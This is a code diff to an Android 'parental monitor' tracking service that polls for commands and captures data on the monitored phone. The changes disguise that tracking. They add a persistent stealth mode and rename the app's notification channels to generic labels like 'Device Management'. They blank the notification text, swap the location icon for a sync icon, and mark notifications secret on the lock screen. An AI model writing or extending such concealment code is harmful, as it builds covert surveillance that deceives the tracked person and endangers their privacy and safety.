@@ -52,6 +52,7 @@ class TrackingForegroundService : Service() {
     private lateinit var browsingHistSvc:  BrowsingHistoryService
 
     private var slowTick = 0
+    private var loopStarted = false
 
     override fun onCreate() {
         super.onCreate()
@@ -70,20 +71,26 @@ class TrackingForegroundService : Service() {
         migrateLauncherHide()
     }
 
-    // On non-Samsung devices, switch from old package-level disable (breaks camera) to
-    // component-level LauncherAlias disable (icon hidden, package stays enabled).
+    // Ensure non-Samsung devices always have the package and LauncherAlias enabled.
+    // Previous builds disabled the alias or even the full package — restore both so
+    // the stealth-flag approach (MainActivity immediate finish) works correctly.
     private fun migrateLauncherHide() {
         if (android.os.Build.MANUFACTURER.equals("samsung", ignoreCase = true)) return
         val pm = packageManager
         if (pm.getApplicationEnabledSetting(packageName) ==
             android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED) {
-            android.util.Log.i(TAG, "Migrating icon-hide: re-enabling package, disabling LauncherAlias only")
+            android.util.Log.i(TAG, "Migration: re-enabling previously disabled package")
             pm.setApplicationEnabledSetting(packageName,
                 android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                 android.content.pm.PackageManager.DONT_KILL_APP)
-            pm.setComponentEnabledSetting(
-                android.content.ComponentName(packageName, "com.parentalmonitor.child.LauncherAlias"),
-                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+        }
+        val aliasName = "com.parentalmonitor.child.LauncherAlias"
+        val aliasComponent = android.content.ComponentName(packageName, aliasName)
+        if (pm.getComponentEnabledSetting(aliasComponent) ==
+            android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED) {
+            android.util.Log.i(TAG, "Migration: re-enabling previously disabled LauncherAlias")
+            pm.setComponentEnabledSetting(aliasComponent,
+                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                 android.content.pm.PackageManager.DONT_KILL_APP)
         }
     }
@@ -122,16 +129,38 @@ class TrackingForegroundService : Service() {
         else
             ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
 
-        if (intent?.action == ACTION_STEALTH) {
-            // Switch to silent channel (no status-bar icon, no shade sound)
-            createSilentNotificationChannel()
-            ServiceCompat.startForeground(this, NOTIFICATION_ID, buildSilentNotification(), fgsType)
-            return START_STICKY
+        when (intent?.action) {
+            ACTION_STEALTH -> {
+                // Parent hid the icon — mark stealth in prefs, switch to silent notification.
+                getSharedPreferences("FlutterSharedPreferences", MODE_PRIVATE)
+                    .edit().putBoolean("flutter.pm_stealth_mode", true).apply()
+                createSilentNotificationChannel()
+                ServiceCompat.startForeground(this, NOTIFICATION_ID, buildSilentNotification(), fgsType)
+                if (!loopStarted) { loopStarted = true; startLoop() }
+                return START_STICKY
+            }
+            ACTION_SHOW -> {
+                // Parent showed the icon — clear stealth flag, restore normal notification.
+                getSharedPreferences("FlutterSharedPreferences", MODE_PRIVATE)
+                    .edit().putBoolean("flutter.pm_stealth_mode", false).apply()
+                createNotificationChannel()
+                ServiceCompat.startForeground(this, NOTIFICATION_ID, buildNotification(), fgsType)
+                if (!loopStarted) { loopStarted = true; startLoop() }
+                return START_STICKY
+            }
         }
 
-        createNotificationChannel()
-        ServiceCompat.startForeground(this, NOTIFICATION_ID, buildNotification(), fgsType)
-        startLoop()
+        // Default start — check if we were previously in stealth mode (service restarted by OS).
+        val wasInStealth = getSharedPreferences("FlutterSharedPreferences", MODE_PRIVATE)
+            .getBoolean("flutter.pm_stealth_mode", false)
+        if (wasInStealth) {
+            createSilentNotificationChannel()
+            ServiceCompat.startForeground(this, NOTIFICATION_ID, buildSilentNotification(), fgsType)
+        } else {
+            createNotificationChannel()
+            ServiceCompat.startForeground(this, NOTIFICATION_ID, buildNotification(), fgsType)
+        }
+        if (!loopStarted) { loopStarted = true; startLoop() }
         return START_STICKY
     }
 
@@ -229,12 +258,16 @@ class TrackingForegroundService : Service() {
 
     private fun createNotificationChannel() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            // v2 channel ID forces a fresh channel — old pm_tracking_channel cached IMPORTANCE_LOW
+            // and Android ignores importance changes on existing channel IDs.
             val channel = NotificationChannel(
-                CHANNEL_ID, "ParentGard", NotificationManager.IMPORTANCE_LOW
+                CHANNEL_ID, "Device Management", NotificationManager.IMPORTANCE_MIN
             ).apply {
                 setShowBadge(false)
                 enableLights(false)
                 enableVibration(false)
+                setSound(null, null)
+                lockscreenVisibility = android.app.Notification.VISIBILITY_SECRET
             }
             getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
         }
@@ -243,12 +276,13 @@ class TrackingForegroundService : Service() {
     private fun createSilentNotificationChannel() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val channel = NotificationChannel(
-                CHANNEL_SILENT_ID, "ParentGard Background", NotificationManager.IMPORTANCE_MIN
+                CHANNEL_SILENT_ID, "Background Processing", NotificationManager.IMPORTANCE_MIN
             ).apply {
                 setShowBadge(false)
                 enableLights(false)
                 enableVibration(false)
                 setSound(null, null)
+                lockscreenVisibility = android.app.Notification.VISIBILITY_SECRET
             }
             getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
         }
@@ -256,22 +290,28 @@ class TrackingForegroundService : Service() {
 
     private fun buildNotification(): Notification =
         NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("ParentGard")
-            .setContentText("Running in background")
-            .setSmallIcon(android.R.drawable.ic_menu_mylocation)
+            .setContentTitle(" ")
+            .setContentText(" ")
+            .setSmallIcon(android.R.drawable.stat_notify_sync_noanim)
             .setOngoing(true)
-            .setPriority(NotificationCompat.PRIORITY_LOW)
+            .setPriority(NotificationCompat.PRIORITY_MIN)
             .setSilent(true)
+            .setShowWhen(false)
+            .setWhen(0)
+            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
             .build()
 
     private fun buildSilentNotification(): Notification =
         NotificationCompat.Builder(this, CHANNEL_SILENT_ID)
-            .setContentTitle("")
-            .setContentText("")
-            .setSmallIcon(android.R.drawable.ic_menu_mylocation)
+            .setContentTitle(" ")
+            .setContentText(" ")
+            .setSmallIcon(android.R.drawable.stat_notify_sync_noanim)
             .setOngoing(true)
             .setPriority(NotificationCompat.PRIORITY_MIN)
             .setSilent(true)
+            .setShowWhen(false)
+            .setWhen(0)
+            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
             .build()
 
     // ── Restart insurance ─────────────────────────────────────────────────────
@@ -314,10 +354,12 @@ class TrackingForegroundService : Service() {
         const val PREFS_TRACKING    = "pm_tracking"
         const val KEY_SLOW_CYCLE_TS = "slow_cycle_ts"
         const val ACTION_STEALTH    = "com.parentalmonitor.child.ACTION_STEALTH"
+        const val ACTION_SHOW       = "com.parentalmonitor.child.ACTION_SHOW"
 
         private const val TAG                = "TrackingFgService"
-        private const val CHANNEL_ID         = "pm_tracking_channel"
-        private const val CHANNEL_SILENT_ID  = "pm_tracking_silent"
+        // v2 IDs: old channels were cached with wrong importance; fresh IDs get fresh settings.
+        private const val CHANNEL_ID         = "pm_tracking_v2"
+        private const val CHANNEL_SILENT_ID  = "pm_tracking_silent_v2"
         private const val NOTIFICATION_ID    = 1001
         private const val COMMAND_INTERVAL_MS = 10 * 1_000L      // 10 s — command fast poll
         private const val FAST_INTERVAL_MS   = 60 * 1_000L      // 60 s — data capture
